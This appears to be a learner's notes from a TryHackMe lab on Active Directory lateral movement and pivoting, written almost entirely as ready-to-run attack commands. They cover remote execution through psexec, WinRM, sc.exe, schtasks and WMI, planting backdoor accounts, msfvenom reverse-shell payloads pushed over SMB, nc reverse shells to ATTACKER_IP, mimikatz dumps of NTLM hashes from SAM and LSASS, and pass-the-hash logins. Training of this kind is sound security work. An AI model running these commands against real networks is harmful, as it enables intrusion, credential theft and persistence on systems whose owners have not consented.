@@ -1,0 +1,255 @@
+Lateral MOvement and Pivorting
+
+get init creds:
+http://distributor.za.tryhackme.com/creds 
+
+ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
+
+A Note on Reverse Shells
+
+If you are using the AttackBox and have joined other network rooms before, be sure to select the IP address assigned to the tunnel interface facing the lateralmovementandpivoting network as your ATTACKER_IP, or else your reverse shells/connections won't work properly. For your convenience, the interface attached to this network is called lateralmovement, so you should be able to get the right IP address by running ip add show lateralmovement
+
+psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
+
+
+
+
+
+winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
+analogy:
+
+
+
+
+We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:
+
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+
+Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:
+
+Enter-PSSession -Computername TARGET -Credential $credential
+
+Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:
+
+Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
+
+
+
+
+We can create and start a service named "THMservice" using the following commands:
+
+sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
+sc.exe \\TARGET start THMservice
+
+The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.
+
+To stop and delete the service, we can then execute the following commands:
+
+sc.exe \\TARGET stop THMservice
+sc.exe \\TARGET delete THMservice
+
+
+schtasks:
+
+schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
+
+schtasks /s TARGET /run /TN "THMtask1" 
+
+schtasks /S TARGET /TN "THMtask1" /DELETE /F
+
+
+msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
+
+smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
+
+
+msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set LHOST lateralmovement
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
+msf6 exploit(multi/handler) > exploit 
+
+[*] Started reverse TCP handler on 10.10.10.16:4444
+
+
+runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
+
+nc -lvp 4443
+
+C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
+C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
+
+
+MOVING LATERAL USING WMI(windows managment instrumentation)
+
+Connecting to WMI From Powershell
+
+Before being able to connect to WMI using Powershell commands, we need to create a PSCredential object with our user and password. This object will be stored in the $credential variable and utilised throughout the techniques on this task:
+
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+
+    DCOM: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
+    Wsman: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).
+
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
+
+Remote Process Creation Using WMI
+
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}
+
+Notice that WMI won't allow you to see the output of any command but will indeed create the required process silently.
+
+On legacy systems, the same can be done using wmic from the command prompt:
+
+wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
+
+Creating Services Remotely with WMI
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+Name = "THMService2";
+DisplayName = "THMService2";
+PathName = "net user munra2 Pass123 /add"; # Your payload
+ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
+StartMode = "Manual"
+}
+
+And then, we can get a handle on the service and start it with the following commands:
+
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
+
+Invoke-CimMethod -InputObject $Service -MethodName StartService
+
+Finally, we can stop and delete the service with the following commands:
+
+Invoke-CimMethod -InputObject $Service -MethodName StopService
+Invoke-CimMethod -InputObject $Service -MethodName Delete
+
+Creating Scheduled Tasks Remotely with WMI
+
+# Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c net user munra22 aSdf1234 /add"
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
+Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+
+To delete the scheduled task after it has been used, we can use the following command:
+
+Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+
+Installing MSI packages through WMI
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+
+We can achieve the same by us using wmic in legacy systems:
+
+wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
+
+
+EXAMPLE:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
+smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
+
+msf6 exploit(multi/handler) > set LHOST lateralmovement
+msf6 exploit(multi/handler) > set LPORT 4445
+msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
+msf6 exploit(multi/handler) > exploit 
+
+[*] Started reverse TCP handler on 10.10.10.16:4445
+
+PS C:\> $username = 't1_corine.waters';
+PS C:\> $password = 'Korine.1994';
+PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
+PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+
+
+
+Use of Alternate Authentication Material:
+NTLM Authentication
+Pass-the-Hash
+
+As a result of extracting credentials from a host where we have attained administrative privileges (by using mimikatz or similar tools), we might get clear-text passwords or hashes that can be easily cracked. However, if we aren't lucky enough, we will end up with non-cracked NTLM password hashes.
+
+mimikatz # privilege::debug
+mimikatz # token::elevate
+
+mimikatz # lsadump::sam   
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 145e02c50333951f71d13c245d352b50
+
+       
+Extracting NTLM hashes from LSASS memory:
+
+This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.
+THMJMP2: Powershell
+
+mimikatz # privilege::debug
+mimikatz # token::elevate
+
+mimikatz # sekurlsa::msv 
+Authentication Id : 0 ; 308124 (00000000:0004b39c)
+Session           : RemoteInteractive from 2 
+User Name         : bob.jenkins
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 2022/04/22 09:55:02
+SID               : S-1-5-21-3330634377-1326264276-632209373-4605
+        msv :
+         [00000003] Primary
+         * Username : bob.jenkins
+         * Domain   : ZA
+         * NTLM     : 6b4a57f67805a663c818106dc0648484
+
+        
+
+We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:
+
+mimikatz # token::revert
+mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
+
+Notice we used token::revert to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work. 
+
+This would be the equivalent of using runas /netonly but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.
+
+To receive the reverse shell, we should run a reverse listener on our AttackBox:Passing the Hash Using Linux:
+
+If you have access to a linux box (like your AttackBox), several tools have built-in support to perform PtH using different protocols. Depending on which services are available to you, you can do the following:
+
+Connect to RDP using PtH:
+
+xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+
+Connect via psexec using PtH:
+
+psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+
+Note: Only the linux version of psexec support PtH.
+
+Connect to WinRM using PtH:
+
+evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
+
+user@AttackBox$ nc -lvp 5555
+
+        
+
+
